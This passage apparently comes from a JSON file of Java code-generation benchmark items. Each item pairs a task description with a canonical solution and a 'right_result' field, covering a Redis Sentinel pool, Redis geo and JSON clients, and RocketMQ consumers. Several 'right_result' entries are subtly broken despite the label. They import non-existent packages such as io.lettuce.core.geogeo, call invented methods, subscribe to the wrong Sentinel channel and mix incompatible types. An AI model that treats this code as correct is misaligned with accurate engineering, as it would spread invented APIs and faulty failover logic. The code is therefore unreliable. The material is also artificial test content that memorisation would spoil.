0; i < multiClusterMap.size(); i++) {\n                    Cluster cluster = multiClusterMap.get(i);\n                    if (cluster.isHealthy()) {\n                        activeMultiClusterIndex = i;\n                        lastClusterCircuitBreakerForcedOpen = false;\n                        break;\n                    }\n                }\n            }\n            return activeMultiClusterIndex;\n        } finally {\n            activeClusterIndexLock.unlock();\n        }\n    }\n\n    private static class Cluster {\n        private final JedisPool connectionPool;\n\n        public Cluster(ClusterConfig config) {\n            JedisPoolConfig poolConfig = new JedisPoolConfig();\n            poolConfig.setMaxTotal(config.getMaxTotal());\n            poolConfig.setMaxIdle(config.getMaxIdle());\n            poolConfig.setMinIdle(config.getMinIdle());\n            poolConfig.setTestOnBorrow(true);\n            poolConfig.setTestWhileIdle(true);\n            poolConfig.setBlockWhenExhausted(true);\n            this.connectionPool = new JedisPool(poolConfig, config.getHost(), config.getPort(), config.getTimeout(), config.getPassword());\n        }\n\n        public Connection getConnection() {\n            try {\n                return connectionPool.getResource();\n            } catch (JedisConnectionException e) {\n                log.error(\"Failed to get connection from cluster\", e);\n                throw e;\n            }\n        }\n\n        public JedisPool getConnectionPool() {\n            return connectionPool;\n        }\n\n        public boolean isHealthy() {\n            try {\n                Jedis jedis = connectionPool.getResource();\n                jedis.ping();\n                jedis.close();\n                return true;\n            } catch (JedisConnectionException e) {\n                log.warn(\"Cluster is unhealthy: {}\", e.getMessage());\n                return false;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Java class that implements a Redis Sentinel connection pool for managing connections to a Redis master server, with automatic failover handling when the master changes.\n\nClass Description: JedisSentinelPool is a connection pool implementation that maintains connections to a Redis master server discovered through Redis Sentinel. It automatically handles master failover by monitoring Sentinel notifications and reconfiguring the connection pool when the master changes.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- factory: JedisFactory - Factory for creating Jedis instances\n- sentinelClientConfig: JedisClientConfig - Configuration for connecting to Sentinels\n- masterListeners: Collection<MasterListener> - Collection of threads monitoring Sentinel servers\n- currentHostMaster: HostAndPort - Current master server address (volatile)\n- initPoolLock: Lock - Lock for thread-safe pool initialization\n\nMethods:\n- JedisSentinelPool(String, Set<HostAndPort>, JedisFactory, JedisClientConfig) -> void - Constructor that initializes the Sentinel pool with master name, Sentinel addresses, factory, and client config\n- initMaster(HostAndPort) -> void - Initializes or updates the master connection pool\n- initSentinels(Set<HostAndPort>, String) -> HostAndPort - Discovers the current master from Sentinels and starts listeners\n- toHostAndPort(List<String>) -> HostAndPort - Converts Sentinel response to HostAndPort object\n- getResource() -> Jedis - Gets a Jedis resource from the pool (overrides parent method)\n- returnResource(Jedis) -> void - Returns a Jedis resource to the pool (overrides parent method)\n\nNested Class MasterListener:\n- masterName: String - Name of the monitored master\n- host: String - Sentinel host address\n- port: int - Sentinel port number\n- subscribeRetryWaitTimeMillis: long - Retry wait time for subscription\n- j: Jedis - Jedis instance for Sentinel connection\n- running: AtomicBoolean - Flag controlling listener thread\n\nMasterListener Methods:\n- MasterListener(String, String, int) -> void - Constructor for Sentinel listener\n- run() -> void - Main listener thread that monitors Sentinel for master changes\n- shutdown() -> void - Gracefully shuts down the listener thread",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPool extends Pool<Jedis> {\n\n  private static final Logger LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n  private final JedisFactory factory;\n  private final JedisClientConfig sentinelClientConfig;\n  protected final Collection<MasterListener> masterListeners = new ArrayList<>();\n  private volatile HostAndPort currentHostMaster;\n  private final Lock initPoolLock = new ReentrantLock(true);\n\n  public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels,\n      final JedisFactory factory, final JedisClientConfig sentinelClientConfig) {\n    super(factory);\n    this.factory = factory;\n    this.sentinelClientConfig = sentinelClientConfig;\n    HostAndPort master = initSentinels(sentinels, masterName);\n    initMaster(master);\n  }\n\n  private void initMaster(HostAndPort master) {\n    initPoolLock.lock();\n    try {\n      if (!master.equals(currentHostMaster)) {\n        currentHostMaster = master;\n        factory.setHostAndPort(currentHostMaster);\n        super.clear();\n        LOG.info(\"Created JedisSentinelPool to master at {}\", master);\n      }\n    } finally {\n      initPoolLock.unlock();\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels, final String masterName) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n    LOG.info(\"Trying to find master from available Sentinels...\");\n\n    for (HostAndPort sentinel : sentinels) {\n      LOG.debug(\"Connecting to Sentinel {}\", sentinel);\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n        if (masterAddr == null || masterAddr.size() != 2) {\n          LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}\", masterName, sentinel);\n          continue;\n        }\n        master = toHostAndPort(masterAddr);\n        LOG.debug(\"Found Redis master at {}\", master);\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Cannot get master address from sentinel running @ {}. Reason: {}. Trying next one.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored...\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where is \" + masterName + \" master is running...\");\n      }\n    }\n\n    LOG.info(\"Redis master running at {}, starting Sentinel listeners...\", master);\n    for (HostAndPort sentinel : sentinels) {\n      MasterListener masterListener = new MasterListener(masterName, sentinel.getHost(), sentinel.getPort());\n      masterListener.setDaemon(true);\n      masterListeners.add(masterListener);\n      masterListener.start();\n    }\n    return master;\n  }\n\n  private HostAndPort toHostAndPort(List<String> getMasterAddrByNameResult) {\n    String host = getMasterAddrByNameResult.get(0);\n    int port = Integer.parseInt(getMasterAddrByNameResult.get(1));\n    return new HostAndPort(host, port);\n  }\n\n  @Override\n  public Jedis getResource() {\n    while (true) {\n      Jedis jedis = super.getResource();\n      jedis.setDataSource(this);\n      final HostAndPort master = currentHostMaster;\n      final HostAndPort connection = jedis.getClient().getHostAndPort();\n      if (master.equals(connection)) {\n        return jedis;\n      } else {\n        returnBrokenResource(jedis);\n      }\n    }\n  }\n\n  @Override\n  public void returnResource(final Jedis resource) {\n    if (resource != null) {\n      try {\n        resource.resetState();\n        super.returnResource(resource);\n      } catch (RuntimeException e) {\n        returnBrokenResource(resource);\n        LOG.debug(\"Resource is returned to the pool as broken\", e);\n      }\n    }\n  }\n\n  protected class MasterListener extends Thread {\n    protected String masterName;\n    protected String host;\n    protected int port;\n    protected long subscribeRetryWaitTimeMillis = 5000;\n    protected volatile Jedis j;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public MasterListener(String masterName, String host, int port) {\n      super(String.format(\"MasterListener-%s-[%s:%d]\", masterName, host, port));\n      this.masterName = masterName;\n      this.host = host;\n      this.port = port;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n      while (running.get()) {\n        try {\n          if (!running.get()) break;\n          final HostAndPort hostPort = new HostAndPort(host, port);\n          j = new Jedis(hostPort, sentinelClientConfig);\n          List<String> masterAddr = j.sentinelGetMasterAddrByName(masterName);\n          if (masterAddr == null || masterAddr.size() != 2) {\n            LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}.\", masterName, hostPort);\n          } else {\n            initMaster(toHostAndPort(masterAddr));\n          }\n          j.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              LOG.debug(\"Sentinel {} published: {}.\", hostPort, message);\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3) {\n                if (masterName.equals(switchMasterMsg[0])) {\n                  initMaster(toHostAndPort(Arrays.asList(switchMasterMsg[3], switchMasterMsg[4])));\n                } else {\n                  LOG.debug(\"Ignoring message on +switch-master for master name {}, our master name is {}\",\n                      switchMasterMsg[0], masterName);\n                }\n              } else {\n                LOG.error(\"Invalid message received on Sentinel {} on channel +switch-master: {}\",\n                    hostPort, message);\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            LOG.error(\"Lost connection to Sentinel at {}:{}. Sleeping 5000ms and retrying.\", host, port, e);\n            try {\n              Thread.sleep(subscribeRetryWaitTimeMillis);\n            } catch (InterruptedException e1) {\n              LOG.error(\"Sleep interrupted: \", e1);\n            }\n          } else {\n            LOG.debug(\"Unsubscribing from Sentinel at {}:{}\", host, port);\n          }\n        } finally {\n          if (j != null) {\n            j.close();\n          }\n        }\n      }\n    }\n\n    public void shutdown() {\n      try {\n        LOG.debug(\"Shutting down listener on {}:{}\", host, port);\n        running.set(false);\n        if (j != null) {\n          j.close();\n        }\n      } catch (RuntimeException e) {\n        LOG.error(\"Caught exception while shutting down: \", e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisFactory;\nimport redis.clients.jedis.SentinelPubSubListener;\nimport redis.clients.jedis.exceptions.JedisException;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport java.util.logging.Logger;\n\npublic class JedisSentinelPool extends GenericObjectPool<Jedis> {\n    private static final Logger LOG = Logger.getLogger(JedisSentinelPool.class.getName());\n    private final String masterName;\n    private final Set<HostAndPort> sentinels;\n    private final JedisFactory factory;\n    private final JedisClientConfig sentinelClientConfig;\n    private volatile HostAndPort currentHostMaster;\n    private final Collection<MasterListener> masterListeners = new ArrayList<>();\n    private final Lock initPoolLock = new ReentrantLock();\n\n    public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels, JedisFactory factory, JedisClientConfig sentinelClientConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.factory = factory;\n        this.sentinelClientConfig = sentinelClientConfig;\n        init();\n    }\n\n    private void init() {\n        initPoolLock.lock();\n        try {\n            currentHostMaster = initSentinels(sentinels, masterName);\n            for (HostAndPort sentinel : sentinels) {\n                MasterListener listener = new MasterListener(masterName, sentinel.getHost(), sentinel.getPort());\n                masterListeners.add(listener);\n                new Thread(listener).start();\n            }\n        } finally {\n            initPoolLock.unlock();\n        }\n    }\n\n    private HostAndPort initSentinels(Set<HostAndPort> sentinels, String masterName) {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(sentinel.getHost(), sentinel.getPort(), sentinelClientConfig)) {\n                List<String> masterInfo = jedis.sentinelGetMasterAddrByName(masterName);\n                if (masterInfo.size() == 2) {\n                    return toHostAndPort(masterInfo);\n                }\n            } catch (Exception e) {\n                LOG.severe(\"Error discovering master from sentinel: \" + sentinel + \", error: \" + e.getMessage());\n            }\n        }\n        throw new JedisException(\"No master found for name: \" + masterName);\n    }\n\n    private HostAndPort toHostAndPort(List<String> response) {\n        return new HostAndPort(response.get(0), Integer.parseInt(response.get(1)));\n    }\n\n    @Override\n    public Jedis getResource() {\n        Jedis jedis = null;\n        while (true) {\n            try {\n                jedis = super.getResource();\n                break;\n            } catch (Exception e) {\n                LOG.warning(\"Failed to get resource, retrying... \" + e.getMessage());\n                try {\n                    Thread.sleep(1000);\n                } catch (InterruptedException ex) {\n                    Thread.currentThread().interrupt();\n                    throw new JedisException(\"Interrupted during resource retrieval\", ex);\n                }\n            }\n        }\n        return jedis;\n    }\n\n    @Override\n    public void returnResource(Jedis jedis) {\n        if (jedis != null && !jedis.isBroken()) {\n            super.returnResource(jedis);\n        }\n    }\n\n    private class MasterListener implements Runnable {\n        private final String masterName;\n        private final String host;\n        private final int port;\n        private final long subscribeRetryWaitTimeMillis = 5000;\n        private Jedis j;\n        private final AtomicBoolean running = new AtomicBoolean(true);\n\n        public MasterListener(String masterName, String host, int port) {\n            this.masterName = masterName;\n            this.host = host;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            while (running.get()) {\n                try {\n                    j = new Jedis(host, port, sentinelClientConfig);\n                    j.subscribe(new SentinelPubSubListener() {\n                        @Override\n                        public void onMessage(String channel, String message) {\n                            if (\"master\".equals(channel)) {\n                                String[] parts = message.split(\",\");\n                                if (parts.length >= 3) {\n                                    String newMasterHost = parts[0];\n                                    int newMasterPort = Integer.parseInt(parts[1]);\n                                    HostAndPort newMaster = new HostAndPort(newMasterHost, newMasterPort);\n                                    if (!newMaster.equals(currentHostMaster)) {\n                                        initMaster(newMaster);\n                                        currentHostMaster = newMaster;\n                                    }\n                                }\n                            }\n                        }\n                    }, \"sentinels\");\n                } catch (Exception e) {\n                    LOG.severe(\"Error connecting to sentinel at \" + host + \":\" + port + \", error: \" + e.getMessage());\n                    try {\n                        Thread.sleep(subscribeRetryWaitTimeMillis);\n                    } catch (InterruptedException ex) {\n                        Thread.currentThread().interrupt();\n                        running.set(false);\n                    }\n                }\n            }\n        }\n\n        public void shutdown() {\n            running.set(false);\n            if (j != null) {\n                j.close();\n            }\n        }\n    }\n\n    public void initMaster(HostAndPort newMaster) {\n        initPoolLock.lock();\n        try {\n            if (newMaster != null) {\n                clear();\n                for (MasterListener listener : masterListeners) {\n                    listener.shutdown();\n                }\n                masterListeners.clear();\n                currentHostMaster = newMaster;\n                initSentinels(sentinels, masterName);\n            }\n        } finally {\n            initPoolLock.unlock();\n        }\n    }\n}"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Java class that provides geospatial operations using Redis, including adding locations, querying locations within a radius, calculating distances between locations, and retrieving position coordinates.\n\nClass Description: The RedisGeoOperations class encapsulates Redis geospatial commands using the Lettuce client. It manages Redis connections and provides methods for common geospatial operations.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance for connection management\n- redisCommands: RedisCommands<String, String> - Synchronous Redis command interface for executing operations\n\nMethods:\n- RedisGeoOperations(String host, int port) -> void - Constructor that initializes the Redis client with specified host and port\n- addGeoLocation(String key, double longitude, double latitude, String member) -> void - Adds a geospatial member with coordinates to the specified key\n- getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) -> Set<String> - Returns members within given radius of a point\n- getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) -> Double - Calculates distance between two members in specified units\n- getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) -> List<GeoWithin<String>> - Returns members within radius with additional options (like distance or coordinates)\n- getGeoPositions(String key, String... members) -> List<GeoCoordinates> - Returns coordinates for specified members\n- closeConnection() -> void - Properly closes Redis connection and shuts down client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisGeoOperations {\n\n    private RedisClient redisClient;\n    private RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        this.redisClient = RedisClient.create(RedisURI.Builder.redis(host, port).build());\n        this.redisCommands = redisClient.connect().sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, \n                                                      GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisCommands.getStatefulConnection().close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisConnectionProvider;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.geogeo.GeoArgs;\nimport io.lettuce.core.geogeo.GeoCoordinates;\nimport io.lettuce.core.geogeo.GeoWithin;\nimport java.util.List;\nimport java.util.Set;\n\npublic class RedisGeoOperations {\n    private final RedisClient redisClient;\n    private final RedisCommands<String, String> redisCommands;\n\n    public RedisGeoOperations(String host, int port) {\n        RedisConnectionProvider connectionProvider = RedisConnectionProvider.create(host, port);\n        this.redisClient = RedisClient.create(connectionProvider);\n        this.redisCommands = redisClient.connect().sync();\n    }\n\n    public void addGeoLocation(String key, double longitude, double latitude, String member) {\n        redisCommands.geoadd(key, longitude, latitude, member);\n    }\n\n    public Set<String> getGeoRadius(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit);\n    }\n\n    public Double getGeoDistance(String key, String member1, String member2, GeoArgs.Unit unit) {\n        return redisCommands.geodist(key, member1, member2, unit);\n    }\n\n    public List<GeoWithin<String>> getGeoRadiusWithArgs(String key, double longitude, double latitude, double radius, GeoArgs.Unit unit, GeoArgs geoArgs) {\n        return redisCommands.georadius(key, longitude, latitude, radius, unit, geoArgs);\n    }\n\n    public List<GeoCoordinates> getGeoPositions(String key, String... members) {\n        return redisCommands.geopos(key, members);\n    }\n\n    public void closeConnection() {\n        redisCommands.close();\n        redisClient.shutdown();\n    }\n}"
  },
  {
    "Task_id": 343,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis JSON data structures using the Lettuce Redis client library. The class should handle connection management and provide methods for common JSON operations.\n\nClass Description: RedisJsonClient is a wrapper class for Lettuce Redis client that specializes in JSON operations. It manages Redis connections and provides synchronous methods to manipulate JSON data stored in Redis.\n\nAttributes:\n- client: RedisClient - The main Redis client instance for connection management\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisJsonClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- jsonGet(String key, JsonPath path) -> JsonValue - Retrieves JSON value at specified path from given key\n- jsonSet(String key, JsonPath path, JsonValue value) -> String - Sets JSON value at specified path for given key\n- jsonDel(String key, JsonPath path) -> Long - Deletes JSON value at specified path from given key\n- jsonArrlen(String key, JsonPath path) -> List<Long> - Gets length of JSON array at specified path\n- jsonArrpop(String key, JsonPath path) -> List<JsonValue> - Pops elements from JSON array at specified path\n- close() -> void - Shuts down the Redis connection and releases resources\n- createJsonValue(String value) -> JsonValue - Creates a new JsonValue from string\n- createJsonObject() -> JsonObject - Creates a new empty JsonObject\n- createJsonArray() -> JsonArray - Creates a new empty JsonArray",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.json.JsonParser;\nimport io.lettuce.core.json.JsonPath;\nimport io.lettuce.core.json.JsonValue;\n\npublic class RedisJsonClient {\n\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        RedisURI redisURI = RedisURI.Builder.redis(host).withPort(port).build();\n        client = RedisClient.create(redisURI);\n        syncCommands = client.connect().sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        List<JsonValue> values = syncCommands.jsonGet(key, path);\n        return values != null && !values.isEmpty() ? values.get(0) : null;\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path, value);\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path);\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonArrlen(key, path);\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        return syncCommands.jsonArrpop(key, path);\n    }\n\n    public void close() {\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public JsonValue createJsonValue(String value) {\n        return syncCommands.getJsonParser().createJsonValue(value);\n    }\n\n    public JsonObject createJsonObject() {\n        return syncCommands.getJsonParser().createJsonObject();\n    }\n\n    public JsonArray createJsonArray() {\n        return syncCommands.getJsonParser().createJsonArray();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.databind.node.ArrayNode;\nimport com.fasterxml.jackson.databind.node.JsonNodeFactory;\nimport com.fasterxml.jackson.databind.node.ObjectNode;\nimport com.fasterxml.jackson.databind.node.TextNode;\n\npublic class RedisJsonClient {\n    private RedisClient client;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisJsonClient(String host, int port) {\n        client = RedisClient.create(\"redis://\" + host + \":\" + port);\n        syncCommands = client.connect().sync();\n    }\n\n    public JsonValue jsonGet(String key, JsonPath path) {\n        String result = syncCommands.jsonGet(key, path.toString());\n        return createJsonValue(result);\n    }\n\n    public String jsonSet(String key, JsonPath path, JsonValue value) {\n        return syncCommands.jsonSet(key, path.toString(), value.toString());\n    }\n\n    public Long jsonDel(String key, JsonPath path) {\n        return syncCommands.jsonDel(key, path.toString());\n    }\n\n    public List<Long> jsonArrlen(String key, JsonPath path) {\n        return syncCommands.jsonArrlen(key, path.toString());\n    }\n\n    public List<JsonValue> jsonArrpop(String key, JsonPath path) {\n        String result = syncCommands.jsonArrPop(key, path.toString());\n        ObjectMapper mapper = new ObjectMapper();\n        JsonNode node = mapper.readTree(result);\n        List<JsonValue> values = new ArrayList<>();\n        for (JsonNode child : node) {\n            values.add(createJsonValue(child.toString()));\n        }\n        return values;\n    }\n\n    public void close() {\n        syncCommands.close();\n        client.shutdown();\n    }\n\n    public JsonValue createJsonValue(String value) {\n        try {\n            ObjectMapper mapper = new ObjectMapper();\n            JsonNode node = mapper.readTree(value);\n            if (node.isObject()) {\n                return new JsonObject(node);\n            } else if (node.isArray()) {\n                return new JsonArray(node);\n            } else {\n                return new TextNode(node.textValue());\n            }\n        } catch (Exception e) {\n            return new TextNode(value);\n        }\n    }\n\n    public JsonObject createJsonObject() {\n        return new JsonObject(JsonNodeFactory.instance.objectNode());\n    }\n\n    public JsonArray createJsonArray() {\n        return new JsonArray(JsonNodeFactory.instance.arrayNode());\n    }\n\n    static class JsonValue {\n        private final JsonNode node;\n\n        public JsonValue(JsonNode node) {\n            this.node = node;\n        }\n\n        public String toString() {\n            return node.toString();\n        }\n    }\n\n    static class JsonObject extends JsonValue {\n        public JsonObject(JsonNode node) {\n            super(node);\n        }\n\n        public void put(String fieldName, JsonValue value) {\n            ((ObjectNode) node).put(fieldName, value.node);\n        }\n\n        public JsonValue get(String fieldName) {\n            return new JsonValue(((ObjectNode) node).get(fieldName));\n        }\n    }\n\n    static class JsonArray extends JsonValue {\n        public JsonArray(JsonNode node) {\n            super(node);\n        }\n\n        public void add(JsonValue value) {\n            ((ArrayNode) node).add(value.node);\n        }\n\n        public JsonValue get(int index) {\n            return new JsonValue(((ArrayNode) node).get(index));\n        }\n    }\n\n    static class JsonPath {\n        private final String path;\n\n        public JsonPath(String path) {\n            this.path = path;\n        }\n\n        public String toString() {\n            return path;\n        }\n    }\n}"
  },
  {
    "Task_id": 362,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer for processing order-related messages. The consumer should be initialized with Spring and configured to consume messages from a specified topic.\n\nClass Description: The OrderPushConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specified topic, configures consumption settings, and processes incoming messages asynchronously.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- topicName: String - The name of the topic to subscribe to (injected from properties)\n- namesrvAddr: String - The address of the NameServer (injected from properties)\n\nMethods:\n- init(): void - Initializes the consumer with configuration settings and starts it. This method is automatically called after construction due to the @PostConstruct annotation.\n  - Input: None\n  - Output: None\n  - Description: Configures the consumer with NameServer address, subscription details, batch size, and consumption strategy. Registers a message listener and starts the consumer.\n\n- (implicit) MessageListenerConcurrently.consumeMessage(List<MessageExt>, ConsumeConcurrentlyContext) -> ConsumeConcurrentlyStatus - Handles incoming messages\n  - Input: \n    - msgs: List<MessageExt> - List of received messages\n    - context: ConsumeConcurrentlyContext - Context for concurrent consumption\n  - Output: ConsumeConcurrentlyStatus - Status indicating whether message processing was successful\n  - Description: The anonymous implementation of MessageListenerConcurrently that processes batches of messages. Currently returns CONSUME_SUCCESS for all messages.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\nimport javax.annotation.PostConstruct;\nimport java.util.List;\n\n@Component\npublic class OrderPushConsumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    @Value(\"${rocketmq.topic.name}\")\n    private String topicName;\n\n    @Value(\"${rocketmq.nameserver.addr}\")\n    private String namesrvAddr;\n\n    @PostConstruct\n    public void init() throws Exception {\n        consumer = new DefaultMQPushConsumer(\"create_order_consumer_group2\");\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.subscribe(topicName,\"*\");\n        consumer.setConsumeMessageBatchMaxSize(100);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n        consumer.start();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "right_result": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;  \nimport org.apache.rocketmq.common.message.MessageExt;  \nimport org.springframework.beans.factory.annotation.Value;  \nimport org.springframework.stereotype.Component;  \nimport javax.annotation.PostConstruct;  \n\n@Component  \npublic class OrderPushConsumer {  \n    @Value(\"${rocketmq.namesrv.addr}\")  \n    private String namesrvAddr;  \n    @Value(\"${rocketmq.topic.name}\")  \n    private String topicName;  \n    private DefaultMQPushConsumer consumer;  \n\n    @PostConstruct  \n    public void init() {  \n        consumer = new DefaultMQPushConsumer(\"OrderConsumerGroup\");  \n        consumer.setNamesrvAddr(namesrvAddr);  \n        consumer.subscribe(topicName, \"*\");  \n        consumer.setConsumeMessageBatchMaxSize(10);  \n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {  \n            for (MessageExt msg : msgs) {  \n                // Process message logic here  \n            }  \n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;  \n        });  \n        try {  \n            consumer.start();  \n        } catch (Exception e) {  \n            e.printStackTrace();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 372,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously process messages from a specified topic, handling message consumption with retry logic for failed messages.\n\nClass Description: The PlanConsumer class is a Spring component that initializes and manages a RocketMQ push consumer. It subscribes to a specific topic, processes incoming messages, and implements retry logic for failed message consumption. The consumer is configured to start automatically after bean initialization.\n\nAttributes:\n- consumerGroup: String - The consumer group name for the RocketMQ consumer, injected from properties\n- namesrvAddr: String - The NameServer address for RocketMQ, injected from properties\n- logger: Logger - SLF4J logger instance for logging messages and errors\n\nMethods:\n- defaultMQPushConsumer(): void - Initializes and starts the RocketMQ consumer. This method is automatically called after bean construction (@PostConstruct). It:\n  1. Creates a DefaultMQPushConsumer instance\n  2. Configures NameServer address\n  3. Subscribes to the specified topic with wildcard tag filter\n  4. Sets consumption offset strategy\n  5. Registers a concurrent message listener\n  6. Starts the consumer\n  The message listener processes messages, logs successful consumption, and implements retry logic (up to 3 attempts) for failed messages.\n\nInput: None (Configuration is injected via @Value annotations)\n\nOutput: None (The consumer runs continuously, processing messages as they arrive)",
